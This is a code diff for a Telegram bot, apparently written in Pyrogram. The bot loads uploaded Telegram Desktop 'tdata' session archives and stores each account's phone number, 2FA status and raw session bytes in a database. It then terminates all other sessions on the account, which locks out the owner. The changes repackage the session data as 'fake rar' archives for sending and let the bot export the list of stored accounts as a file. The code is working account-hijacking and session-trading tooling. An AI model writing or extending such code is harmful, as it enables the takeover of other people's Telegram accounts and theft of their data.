@@ -106,7 +106,7 @@ def require_verified(func):
             for admin_id in ADMINS:
                 await client.send_message(
                     admin_id,
-                    f"🚨 Unverified user tried to access: {user_id} (@{message.from_user.username})"
+                    f"🚨 Unverified user tried to access: {user_id} (@{message.from_user.username}) \nTᴏ ᴠᴇʀɪꜰʏ <code> /verify {user_id} </code>."
                 )
             return await message.reply("⛔ You are not verified yet. Please wait for admin approval.")
     return wrapper
@@ -123,8 +123,16 @@ async def check_2fa(client):
     except Exception as e:
         return f"2FA: Unknown ({e})"
 
+async def show_rar(tdata_path: str, message: Message, num):
+    tmp_dir = tempfile.mkdtemp()
+    rar_path = os.path.join(tmp_dir, f"tdata{num}.rar")
+    shutil.make_archive(rar_path.replace(".rar", ""), "zip", tdata_path)
+    os.rename(rar_path.replace(".rar", ".zip"), rar_path)  # fake rar extension
 
-async def show_tdata_structure_and_rar(tdata_path: str, message: Message, num):
+    await message.reply_document(rar_path, caption=f"📦 {num} TDATA as RAR")
+    shutil.rmtree(tmp_dir, ignore_errors=True)
+    
+async def show_tdata_structure(tdata_path: str, message: Message, num):
     # 1️⃣ Build structure preview
     structure = []
     for root, dirs, files in os.walk(tdata_path):
@@ -141,15 +149,6 @@ async def show_tdata_structure_and_rar(tdata_path: str, message: Message, num):
     await message.reply(
         f"📂 TDATA structure at:\n`{tdata_path}`\n```\n{preview}\n```"
     )
-
-    # 2️⃣ Pack into .rar
-    tmp_dir = tempfile.mkdtemp()
-    rar_path = os.path.join(tmp_dir, f"tdata{num}.rar")
-    shutil.make_archive(rar_path.replace(".rar", ""), "zip", tdata_path)
-    os.rename(rar_path.replace(".rar", ".zip"), rar_path)  # fake rar extension
-
-    await message.reply_document(rar_path, caption=f"📦 {num} TDATA as RAR")
-    shutil.rmtree(tmp_dir, ignore_errors=True)
 
 async def show_zip_structure(zip_path, message, client):
     try:
@@ -401,8 +400,7 @@ async def handle_archive(client, message):
             
             await sy.edit(f"➡️ Sᴛᴇᴘ 4.{offset}: Pʀᴏᴄᴇssɪɴɢ ᴛᴅᴀᴛᴀ ᴀᴛ `{tdata_path}`")
             try:
-                await show_tdata_structure_and_rar(tdata_path, message, offset)
-                
+                await show_tdata_structure(tdata_path, message, offset)
                 tdesk = TDesktop(tdata_path)
                 if not tdesk.isLoaded():
                     results.append(f"#{offset} ⚠️ Fᴀɪʟᴇᴅ ᴛᴏ ʟᴏᴀᴅ (ᴄᴏʀʀᴜᴘᴛᴇᴅ ᴛᴅᴀᴛᴀ)")
@@ -438,11 +436,7 @@ async def handle_archive(client, message):
                     "spam": getattr(me, "restricted", False),
                 }
                 sydno = await db.save_account(me.id, info, tdata_bytes)
-
-                
-              #  await show_tdata_structure_and_rar(tdata_path, message, sydno)
-                
-                
+                await show_rar(tdata_path, message, sydno)
                 nsyd = await terminate_all_other_sessions(tele_client)
                 await message.reply(f"{sydno} ~ +{me.phone}: {nsyd}")
                 await message.reply(f"{sydno} ~ +{me.phone}: {syd}")
@@ -696,6 +690,8 @@ async def clean_db(client, message):
 
 
 from pyrogram import Client, filters
+import os
+import tempfile
 
 @Client.on_message(filters.command("show_db") & filters.private)
 async def show_db(client, message):
@@ -709,4 +705,13 @@ async def show_db(client, message):
         text += f"  Name: {acc['name']}\n"
         text += f"  Phone: {acc['phone']}\n\n"
 
-    await message.reply(text)
+    if len(text) < 4000:  # safe limit
+        await message.reply(text)
+    else:
+        with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".txt") as tmp:
+            tmp.write(text)
+            tmp_path = tmp.name
+
+        await message.reply_document(tmp_path, caption="📋 Stored Accounts")
+        os.remove(tmp_path)
+
